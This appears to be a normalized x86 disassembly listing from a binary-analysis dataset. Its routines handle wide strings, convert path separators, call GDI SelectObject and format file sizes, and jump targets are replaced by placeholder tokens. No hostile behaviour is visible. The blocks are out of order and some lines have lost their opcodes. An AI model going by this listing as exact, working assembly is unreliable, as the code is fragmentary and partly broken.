lea ecx [ esp + 0x18 ]
call sub_41a290
mov eax esi
jmp r-xdata
mov ecx [ esi + 0x4 ]
push ecx
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_41a620
mov eax [ esi + 0x8 ]
add esi 0x8
cmp eax ebx
jne r-xdata
cmp eax 0x104
jne r-xdata
call sub_41a770
jmp r-xdata
mov ecx [ esp + 0xa74 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0xa68
retn 0xc
lea eax [ esp + 0x44 ]
mov edx 0x208
lea ecx [ esp + 0x664 ]
call sub_41a380
cmp esi ebx
je r-xdata
lea esi [ esp + 0x10 ]
call sub_41aed0
lea ecx [ esp + 0x18 ]
call sub_41a290
mov eax 0x8007007a
jmp r-xdata
mov edi eax
lea ecx [ esp + 0x24e ]
mov eax 0x22
push 0x20b
push ecx
lea esi [ esp + 0x66c ]
mov [ esp + 0x254 ] ax
call sub_41a3d0
add esp 0x8
test al al
jne r-xdata
push ebx
call [ GetModuleHandleW@IAT ]
cmp esi eax
je r-xdata
lea edx [ esp + 0x24c ]
push edx
call [ lstrlenW@IAT ]
mov ecx 0x22
xor edx edx
mov [ esp + eax * 2 + 0x24c ] cx
mov [ esp + eax * 2 + 0x24e ] dx
lea eax [ esp + 0x24c ]
push eax
push r--data
lea ecx [ esp + 0x20 ]
push ecx
lea esi [ esp + 0x10 ]
call sub_41aed0
lea ecx [ esp + 0x18 ]
call sub_41a290
mov eax 0x80004005
jmp r-xdata
lea ecx [ esp + 0x664 ]
push ecx
push r--data
lea edx [ esp + 0x20 ]
push edx
jmp r-xdata
lea esi [ esp + 0x10 ]
call sub_41aed0
lea edx [ esp + 0x664 ]
push edx
push r--data
lea eax [ esp + 0x20 ]
push eax
call sub_41a620
mov edi eax
cmp edi ebx
jl r-xdata
call sub_41a620
mov edi eax
cmp edi ebx
jl r-xdata
cmp [ esp + 0xa84 ] ebx
je r-xdata
mov eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x48 ]
push ecx
lea edx [ esp + 0x20 ]
call sub_41c160
mov ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x48 ]
push edx
lea edx [ esp + 0x20 ]
call sub_41a6b0
jmp r-xdata
sub_41c450
mov eax ecx
mov ecx [ eax + 0x1c ]
or [ eax + 0x4 ] 0x8
mov edx [ ecx ]
push esi
mov esi [ eax + 0x34 ]
push esi
mov esi [ eax + 0x30 ]
push esi
push eax
mov eax [ edx + 0x20 ]
call eax
pop esi
retn
sub_41c470
push ebx
push ebp
push esi
push edi
mov edi eax
call sub_4230c0
mov eax [ edi + 0x8 ]
mov ecx [ rw-data ]
mov ebx [ SelectObject@IAT ]
push eax
push ecx
call ebx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
push edx
mov ebp eax
mov eax [ esp + 0x1c ]
push 0x0
push eax
mov eax [ esp + 0x2c ]
push ecx
push edi
mov edi [ rw-data ]
xor edx edx
xor esi esi
call sub_4232d0
mov edx [ rw-data ]
push ebp
push edx
call ebx
pop edi
pop esi
pop ebp
pop ebx
retn 0x10
sub_41c4d0
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov esi ecx
mov edi [ esi + 0x14 ]
sub edi [ esi + 0xc ]
push 0x0
push edi
push 0x0
push 0x0
push ebp
mov ecx rw-data
call sub_420df0
mov ecx [ esi + 0x2c ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebp
retn 0xc
mov eax [ esi + 0x28 ]
imul eax edi
cdq
idiv ecx
push ebx
mov edi rw-data
mov ebx eax
call sub_4230c0
cmp ebx [ rw-data ]
jge r-xdata
mov edi rw-data
call sub_4230c0
cmp ebx [ rw-data ]
jge r-xdata
call sub_4230c0
mov ebx [ rw-data ]
push 0x0
push ebx
push 0x0
push 0x0
push ebp
mov ecx rw-data
call sub_420df0
sub ebx 0x11
cmp [ esi + 0x38 ] 0xffff
jne r-xdata
call sub_4230c0
mov ebx [ rw-data ]
mov edi rw-data
call sub_4230c0
cmp [ esi + 0x38 ] ebx
mov ebp [ rw-data ]
jle r-xdata
mov [ esi + 0x38 ] 0x0
mov edi rw-data
call sub_4230c0
mov esi [ esi + 0x38 ]
sub esi [ rw-data ]
call sub_4230c0
mov eax [ rw-data ]
mov ecx [ esp + 0x14 ]
push eax
push ebp
push esi
push ecx
mov eax edi
call sub_41c470
pop ebx
call sub_4230c0
mov ebp [ rw-data ]
sub ebp [ esi + 0x38 ]
add ebp ebx
sub_41c5c0
push ecx
push esi
mov esi eax
mov eax [ esi + 0x60 ]
push edi
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
push eax
mov [ esi + 0x60 ] 0x0
mov [ esi + 0x64 ] 0x0
mov [ esi + 0x68 ] 0x0
call sub_43f960
add esp 0x4
lea edi [ esi + 0x2c ]
mov [ esi ] r--data
call sub_422960
mov esi [ esi + 0x28 ]
sub esi 0x10
lea ecx [ esi + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ esp + 0x8 ]
mov edi [ esi + 0x64 ]
push ecx
call sub_429630
mov edx [ esi + 0x60 ]
push edx
call sub_43f960
add esp 0x8
pop edi
pop esi
pop ecx
retn
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
sub_41c660
push 0xffffffff
push sub_45a9e8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
push esi
call sub_422b50
lea eax [ esi + 0x54 ]
mov [ esp + 0x14 ] 0x0
push eax
mov [ esi ] r--data
call sub_40f4f0
mov [ esi + 0x6c ] 0x0
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_41c6c0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
push 0x0
push 0x40000000
push esi
push ebx
call sub_447f60
push 0x0
push 0x400
mov ebp edx
mov edi eax
push ebp
push edi
call sub_447f60
mov ecx eax
or ecx edx
je r-xdata
or edi ebp
je r-xdata
mov ecx [ esp + 0x1c ]
push edx
push eax
push r--data
call sub_41f480
mov esi [ esp + 0x2c ]
add esp 0xc
push 0x2
mov eax r--data
call sub_429cc0
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x0
push 0x100000
push esi
push ebx
call sub_447f60
or eax edx
je r-xdata
fild [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
sub esp 0x8
fmul [ r--data ]
fstp [ esp ]
push r--data
call sub_41f480
mov esi [ esp + 0x2c ]
add esp 0xc
push 0x2
mov eax r--data
call sub_429cc0
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x0
push 0x400
push esi
push ebx
call sub_447f60
or eax edx
mov ecx [ esp + 0x1c ]
je r-xdata
fild [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
sub esp 0x8
fmul [ r--data ]
fstp [ esp ]
push r--data
call sub_41f480
mov esi [ esp + 0x2c ]
add esp 0xc
push 0x2
mov eax r--data
call sub_429cc0
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push r--data
call sub_41f480
mov esi [ esp + 0x28 ]
add esp 0x8
push 0x4
mov eax r--data
call sub_429cc0
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
fild [ esp + 0x14 ]
sub esp 0x8
fmul [ r--data ]
fstp [ esp ]
push r--data
call sub_41f480
mov esi [ esp + 0x2c ]
add esp 0xc
push 0x2
mov eax r--data
call sub_429cc0
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
sub_41c820
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
retn
push esi
xor esi esi
test eax eax
jbe r-xdata
pop esi
push ebx
push ebp
lea ebx [ edi + 0x4 ]
lea ebp [ esi + 0x8 ]
cmp eax esi
ja r-xdata
cmp [ edi + 0x18 ] ebp
jb r-xdata
call sub_43f111
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax [ edi + 0x14 ]
inc esi
cmp eax esi
ja r-xdata
cmp [ edi + 0x14 ] esi
ja r-xdata
mov ecx 0x2f
cmp cx [ eax + esi * 2 ]
jne r-xdata
pop ebp
pop ebx
cmp [ edi + 0x18 ] ebp
jb r-xdata
call sub_43f111
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov edx 0x5c
mov [ eax + esi * 2 ] dx
sub_41c880
sub esp 0x10
push ebp
mov ebp [ esp + 0x18 ]
test ebx ebx
jne r-xdata
mov ecx [ edx + 0x14 ]
push esi
push edi
cmp eax ecx
jae r-xdata
cmp eax [ edx + 0x14 ]
jbe r-xdata
pop edi
or eax 0xffffffff
pop esi
sub ecx eax
mov edi ecx
cmp ebx edi
ja r-xdata
pop ebp
add esp 0x10
retn 0x4
mov ecx 0x1
sub ecx ebx
add edi ecx
mov ecx [ edx + 0x18 ]
mov [ esp + 0x14 ] ecx
cmp ecx 0x8
jb r-xdata
lea ecx [ edx + 0x4 ]
mov [ esp + 0xc ] ecx
mov ecx [ edx + 0x4 ]
add edx 0x4
mov [ esp + 0xc ] edx
jmp r-xdata
movzx edx [ ebp ]
jmp r-xdata
lea eax [ ecx + eax * 2 ]
cmp [ eax ] dx
je r-xdata
test eax eax
je r-xdata
add eax 0x2
sub ecx 0x1
jne r-xdata
mov esi ebx
mov edx ebp
mov ecx eax
test ebx ebx
jbe r-xdata
cmp [ esp + 0x14 ] 0x8
mov ecx [ esp + 0xc ]
jb r-xdata
mov bp [ ecx ]
cmp bp [ edx ]
jne r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebp
add esp 0x10
retn 0x4
mov ecx [ ecx ]
mov cx bp
cmp cx [ edx ]
sbb edx edx
and edx 0xfffffffe
add edx 0x1
je r-xdata
add ecx 0x2
add edx 0x2
sub esi 0x1
jne r-xdata
mov ebp [ esp + 0x20 ]
mov ecx eax
sub ecx [ esp + 0x10 ]
or edx 0xffffffff
sar ecx 0x1
sub edx ecx
add edi edx
add eax 0x2
jmp r-xdata
mov [ esp + 0x10 ] eax
mov ecx edi
test edi edi
jbe r-xdata
sub_41c960
push 0xffffffff
push sub_45ade0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0xa8 ]
mov eax [ esp + 0xac ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
mov eax 0xfffffffe
mov eax ebp
lea esi [ eax + 0x2 ]
mov edi edi
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
je r-xdata
mov eax ebp
mov [ esp + 0x1c ] 0x0
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
mov ebx eax
push ebp
xor eax eax
call sub_41c880
mov edi eax
cmp edi 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax ebp
mov [ esp + 0x74 ] 0x7
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] cx
lea edx [ eax + 0x2 ]
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x80 ]
xor ecx esp
call sub_43f96b
add esp 0x90
retn 0x8
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax ebp
lea esi [ esp + 0x60 ]
call sub_429cc0
add edi [ esp + 0x70 ]
cmp [ esp + 0x74 ] 0x8
jb r-xdata
inc [ esp + 0x1c ]
mov eax ebp
lea edx [ eax + 0x2 ]
mov edi edi
mov edx [ esp + 0x60 ]
push edx
call sub_43f960
add esp 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
mov edx [ esp + 0x18 ]
sar eax 0x1
mov ebx eax
push ebp
mov eax edi
call sub_41c880
mov edi eax
cmp edi 0xffffffff
jne r-xdata
cmp [ esp + 0x1c ] 0x0
jne r-xdata
mov eax ebp
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov edi [ esp + 0x18 ]
sub eax edx
sar eax 0x1
mov ebx eax
push ebp
xor eax eax
mov edx edi
call sub_41c880
test eax eax
je r-xdata
mov eax ebp
lea edx [ eax + 0x2 ]
jmp r-xdata
push edi
mov ecx eax
xor edx edx
lea esi [ esp + 0x60 ]
call sub_428c80
push eax
lea esi [ esp + 0x28 ]
mov [ esp + 0xa4 ] 0x0
call sub_428940
mov ebx [ esp + 0x20 ]
mov eax esi
push eax
mov [ esp + 0xa4 ] 0x1
call sub_428670
call sub_429950
lea esi [ esp + 0x5c ]
mov [ esp + 0xa0 ] 0xffffffff
call sub_429950
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov ebx eax
push ebp
xor eax eax
mov edx edi
call sub_41c880
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
xor ecx ecx
mov eax ebp
mov [ esp + 0x74 ] 0x7
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x60 ] cx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax ebp
lea esi [ esp + 0x60 ]
call sub_429cc0
add edi [ esp + 0x70 ]
cmp [ esp + 0x74 ] 0x8
jb r-xdata
mov eax ebp
lea edx [ eax + 0x2 ]
jmp r-xdata
mov edx [ esp + 0x60 ]
push edx
call sub_43f960
add esp 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov esi [ esp + 0x18 ]
sub eax edx
sar eax 0x1
mov ebx eax
push ebp
mov eax edi
mov edx esi
call sub_41c880
push esi
mov edx edi
cmp eax 0xffffffff
jne r-xdata
mov ecx eax
sub ecx edi
lea esi [ esp + 0x44 ]
call sub_428c80
mov [ esp + 0xa0 ] 0x5
xor ecx ecx
xor esi esi
push 0xffffffff
mov [ esp + 0x80 ] cx
mov ebx 0x7
push esi
lea ecx [ esp + 0x80 ]
mov [ esp + 0x98 ] ebx
mov [ esp + 0x94 ] esi
call sub_429a10
mov [ esp + 0xa0 ] bl
cmp [ esp + 0x58 ] 0x8
jb r-xdata
or ecx eax
lea esi [ esp + 0x28 ]
call sub_428c80
xor ecx ecx
mov [ esp + 0xa0 ] 0x2
push 0xffffffff
mov [ esp + 0x64 ] cx
push ecx
mov ebx 0x7
lea ecx [ esp + 0x64 ]
mov [ esp + 0x7c ] ebx
mov [ esp + 0x78 ] 0x0
call sub_429a10
mov esi 0x8
mov [ esp + 0xa0 ] 0x4
cmp [ esp + 0x3c ] esi
jb r-xdata
xor eax eax
mov [ esp + 0x58 ] ebx
mov [ esp + 0x54 ] esi
mov [ esp + 0x44 ] ax
cmp [ esp + 0x8c ] esi
je r-xdata
mov edx [ esp + 0x44 ]
push edx
call sub_43f960
add esp 0x4
xor eax eax
mov [ esp + 0x3c ] ebx
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] ax
cmp [ esp + 0x70 ] eax
je r-xdata
mov edx [ esp + 0x28 ]
push edx
call sub_43f960
add esp 0x4
mov [ esp + 0xa0 ] 0xffffffff
cmp [ esp + 0x90 ] 0x8
jb r-xdata
mov ebx [ esp + 0x20 ]
lea ecx [ esp + 0x78 ]
push ecx
call sub_428670
mov ebx 0x7
mov [ esp + 0xa0 ] 0xffffffff
cmp [ esp + 0x74 ] esi
jb r-xdata
mov ebx [ esp + 0x20 ]
lea ecx [ esp + 0x5c ]
push ecx
call sub_428670
xor eax eax
mov [ esp + 0x90 ] ebx
mov [ esp + 0x8c ] esi
mov [ esp + 0x7c ] ax
mov edx [ esp + 0x7c ]
push edx
call sub_43f960
add esp 0x4
mov eax ebp
lea edx [ eax + 0x2 ]
jmp r-xdata
mov edx [ esp + 0x60 ]
push edx
call sub_43f960
add esp 0x4
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
mov edx [ esp + 0x18 ]
sar eax 0x1
mov ebx eax
push ebp
mov eax edi
call sub_41c880
mov edi eax
cmp edi 0xffffffff
jne r-xdata
sub_41cdb0
push 0xffffffff
push sub_45b138
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x74 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x84 ]
xor ebx ebx
cmp eax ebx
je r-xdata
xor al al
jmp r-xdata
xor ecx ecx
mov [ esp + 0x54 ] cx
mov ecx eax
mov [ esp + 0x68 ] 0x7
mov [ esp + 0x64 ] ebx
lea esi [ ecx + 0x2 ]
jmp r-xdata
mov ecx [ esp + 0x74 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_43f96b
add esp 0x6c
retn
mov dx [ ecx ]
add ecx 0x2
cmp dx bx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
lea esi [ esp + 0x54 ]
call sub_429cc0
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x80 ] ebx
call sub_40f4f0
lea eax [ esp + 0x18 ]
push eax
push r--data
mov edx esi
mov [ esp + 0x84 ] 0x1
call sub_41c960
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jne r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push r--data
mov edx esi
call sub_41c960
test eax eax
je r-xdata
cmp eax ebx
ja r-xdata
lea esi [ esp + 0x18 ]
call sub_429670
cmp [ esp + 0x68 ] 0x8
jmp r-xdata
lea esi [ esp + 0x18 ]
call sub_429670
cmp [ esp + 0x68 ] 0x8
jb r-xdata
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x34 ]
call sub_428a10
mov [ esp + 0x7c ] 0x2
mov ecx [ esp + 0x28 ]
mov esi [ esp + 0x24 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
mov edi 0x1
add ecx edx
lea ebp [ edi + 0x7 ]
cmp ecx edi
jbe r-xdata
call sub_4407b7
jb r-xdata
mov edx [ esp + 0x54 ]
push edx
call sub_43f960
add esp 0x4
cmp [ esp + 0x4c ] ebp
jb r-xdata
lea ebx [ edi + 0x1b ]
mov edi edi
mov al 0x1
mov eax [ esp + 0x54 ]
push eax
call sub_43f960
add esp 0x4
xor edx edx
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] dx
cmp esi ebx
je r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call sub_43f960
mov esi [ esp + 0x28 ]
add esp 0x4
mov ecx [ esp + 0x24 ]
push 0x0
lea edx [ ebx + ecx ]
push edx
or eax 0xffffffff
lea esi [ esp + 0x3c ]
call sub_4290b0
mov eax [ esp + 0x38 ]
cmp [ esp + 0x4c ] ebp
jae r-xdata
call sub_4407b7
mov edx [ esp + 0x18 ]
push edx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
call sub_43f960
add esp 0x4
cmp [ esp + 0x68 ] ebp
mov eax [ esp + 0x30 ]
mov edi [ esp + 0x28 ]
push eax
mov eax esi
call sub_429630
mov ecx [ esp + 0x28 ]
add esp 0x4
push ecx
call sub_43f960
add esp 0x4
push eax
call sub_428f30
add esp 0x4
cmp eax 0x2
je r-xdata
lea eax [ esp + 0x38 ]
mov ecx [ esp + 0x28 ]
mov esi [ esp + 0x24 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
inc edi
add eax edx
add ebx 0x1c
cmp edi eax
jb r-xdata
mov eax [ esp + 0x38 ]
cmp [ esp + 0x4c ] ebp
jae r-xdata
push 0x1
mov eax r--data
lea ecx [ esp + 0x38 ]
call sub_429170
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x24 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
xor ebx ebx
push eax
call sub_441ae9
add esp 0x4
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x38 ]
cmp [ esp + 0x4c ] ebp
jb r-xdata
xor edx edx
lea esi [ esp + 0x18 ]
mov [ esp + 0x4c ] 0x7
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] dx
call sub_429670
cmp [ esp + 0x68 ] ebp
jb r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call sub_43f960
add esp 0x4
mov eax [ esp + 0x54 ]
push eax
call sub_43f960
add esp 0x4
xor al al
jmp r-xdata
sub_41d0b0
push 0xffffffff
push sub_45b208
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebp ebp
cmp esi ebp
je r-xdata
xor al al
jmp r-xdata
push esi
call sub_428f30
add esp 0x4
cmp eax 0x1
je r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_43f96b
add esp 0x60
retn
mov al 0x1
xor eax eax
mov [ esp + 0x4c ] ax
mov ebx 0x7
mov eax esi
mov [ esp + 0x60 ] ebx
mov [ esp + 0x5c ] ebp
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx bp
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax esi
lea esi [ esp + 0x4c ]
call sub_429cc0
lea ecx [ esp + 0x14 ]
push ecx
mov [ esp + 0x74 ] ebp
call sub_40f4f0
lea edx [ esp + 0x14 ]
push edx
push r--data
mov edx esi
mov [ esp + 0x78 ] 0x1
call sub_41c960
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
sub ecx [ esp + 0x20 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x14 ]
push eax
push r--data
mov edx esi
call sub_41c960
test eax eax
je r-xdata
xor edx edx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x40 ] ebp
mov [ esp + 0x30 ] dx
lea ecx [ eax - 0x1 ]
xor edi edi
mov [ esp + 0x70 ] 0x2
test ecx ecx
jbe r-xdata
lea esi [ esp + 0x14 ]
call sub_429670
cmp [ esp + 0x60 ] 0x8
lea esi [ esp + 0x14 ]
call sub_429670
lea esi [ esp + 0x48 ]
call sub_429950
mov edi 0x8
xor ebx ebx
xor al al
jmp r-xdata
mov ecx [ esp + 0x4c ]
push ecx
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x24 ]
sub ecx [ esp + 0x20 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
lea esi [ eax - 0x1 ]
cmp esi eax
jb r-xdata
cmp [ esp + 0x44 ] edi
jb r-xdata
mov edx [ esp + 0x20 ]
lea eax [ ebx + edx ]
push ebp
push eax
or eax 0xffffffff
lea esi [ esp + 0x34 ]
call sub_4290b0
push 0x1
mov eax r--data
mov ecx esi
call sub_429170
mov ecx [ esp + 0x24 ]
sub ecx [ esp + 0x20 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
inc edi
lea ecx [ eax - 0x1 ]
add ebx 0x1c
cmp edi ecx
jb r-xdata
call sub_4407b7
mov eax [ esp + 0x20 ]
lea edx [ esi * 8 ]
sub edx esi
lea ecx [ eax + edx * 4 ]
push ebp
push ecx
or eax 0xffffffff
lea esi [ esp + 0x34 ]
call sub_4290b0
mov eax [ esp + 0x30 ]
cmp [ esp + 0x44 ] edi
jae r-xdata
call sub_4407b7
xor eax eax
lea esi [ esp + 0x14 ]
mov [ esp + 0x44 ] ebx
mov [ esp + 0x40 ] ebp
mov [ esp + 0x30 ] ax
call sub_429670
cmp [ esp + 0x60 ] edi
jmp r-xdata
mov edx [ esp + 0x30 ]
push edx
call sub_43f960
add esp 0x4
cmp edi eax
jb r-xdata
mov edi 0x8
lea ebx [ edi - 0x1 ]
cmp [ esp + 0x44 ] edi
jb r-xdata
push r--data
push eax
call sub_43fd57
add esp 0x8
cmp eax ebp
je r-xdata
lea eax [ esp + 0x30 ]
jb r-xdata
lea eax [ esp + 0x30 ]
mov eax [ esp + 0x30 ]
jmp r-xdata
push eax
call sub_44040f
add esp 0x4
cmp [ esp + 0x44 ] edi
jb r-xdata
push eax
call sub_41cdb0
add esp 0x4
test al al
jne r-xdata
xor eax eax
lea esi [ esp + 0x14 ]
mov [ esp + 0x44 ] ebx
mov [ esp + 0x40 ] ebp
mov [ esp + 0x30 ] ax
call sub_429670
cmp [ esp + 0x60 ] edi
jb r-xdata
mov edx [ esp + 0x30 ]
push edx
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x4c ]
push ecx
call sub_43f960
add esp 0x4
sub_41d380
push 0xffffffff
push sub_45b268
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x24 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x3c ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x4c ]
mov ebx ebp
mov esi ecx
call sub_421bb0
test al al
je r-xdata
xor al al
jmp r-xdata
xor edi edi
xor eax eax
mov [ esp + 0x20 ] ax
mov eax esi
mov [ esp + 0x34 ] 0x7
mov [ esp + 0x30 ] edi
lea edx [ eax + 0x2 ]
mov ecx [ esp + 0x3c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x24 ]
xor ecx esp
call sub_43f96b
add esp 0x34
retn
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax esi
lea esi [ esp + 0x20 ]
call sub_429cc0
mov [ esp + 0x44 ] edi
lea ecx [ esp + 0x18 ]
mov edi 0x20
push ecx
mov eax esi
mov [ esp + 0x1c ] edi
call sub_428e20
xor ebx ebx
call sub_429980
lea edx [ esp + 0x18 ]
mov [ esp + 0x18 ] edi
push edx
mov edi esi
call sub_428ea0
mov ebx eax
inc ebx
or eax 0xffffffff
call sub_429980
lea eax [ esp + 0x18 ]
push eax
mov eax esi
mov [ esp + 0x1c ] 0x5c
call sub_428e20
xor ebx ebx
call sub_429980
lea ecx [ esp + 0x18 ]
push ecx
mov eax esi
mov [ esp + 0x1c ] 0x2f
call sub_428e20
call sub_429980
call sub_41c820
mov edx esi
push ebx
push edx
or eax 0xffffffff
mov esi ebp
call sub_4290b0
mov esi 0x8
cmp [ ebp + 0x18 ] esi
jb r-xdata
lea ecx [ ebp + 0x4 ]
mov ecx [ ebp + 0x4 ]
jmp r-xdata
cmp [ esp + 0x34 ] esi
jb r-xdata
cmp [ esp + 0x34 ] esi
jb r-xdata
call sub_41d0b0
test al al
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x20 ]
push ecx
call sub_43f960
add esp 0x4
mov eax [ esp + 0x20 ]
push eax
call sub_43f960
add esp 0x4
sub_41d4f0
test [ esi + 0x4 ] 0x1
push edi
je r-xdata
pop edi
retn
mov ecx [ esi + 0x64 ]
sub ecx [ esi + 0x60 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
mov ecx [ esi + 0x64 ]
sub ecx [ esi + 0x60 ]
mov edi [ esi + 0x6c ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
lea edx [ edx + ecx - 0x1 ]
cmp edi edx
jb r-xdata
inc edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x6c ] 0x0
jmp r-xdata
mov edx [ esi + 0x60 ]
lea ecx [ edi * 8 ]
sub ecx edi
cmp [ edx + ecx * 4 + 0x18 ] 0x8
lea eax [ edx + ecx * 4 ]
jb r-xdata
call sub_4407b7
mov ecx [ esi + 0x64 ]
sub ecx [ esi + 0x60 ]
mov edi [ esi + 0x6c ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp edi eax
jb r-xdata
add eax 0x4
push eax
push esi
call sub_41ff60
mov eax [ eax + 0x4 ]
push eax
push esi
call sub_41ff60
pop edi
retn
sub_41d5a0
push ecx
test [ esi + 0x4 ] 0x1
push ebx
push edi
je r-xdata
pop edi
pop ebx
